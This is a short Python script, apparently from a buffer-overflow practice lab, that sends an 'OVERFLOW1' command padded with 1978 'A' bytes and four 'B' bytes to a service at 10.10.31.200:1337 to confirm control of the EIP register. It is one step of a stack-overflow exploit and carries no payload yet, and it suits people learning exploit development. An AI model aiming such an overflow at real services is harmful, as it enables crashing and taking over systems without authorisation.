#!/usr/bin/python3

import socket, sys
from time import sleep

# Overwrite EIP
# EIP 6F43396E
# [*] Exact match at offset 1978


host = '10.10.31.200'
port = 1337
shellcode = "A" * 1978 + "B" * 4


def inject(host, port, pattern_file):
	
			try:
				s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))

				s.send(("OVERFLOW1 " + shellcode).encode('utf-8'))
				s.close()

			except Exception as E:
				print(E)
				print("error.. unable to connect")
				sys.exit()

if __name__ == '__main__':
	inject(host, port, shellcode)
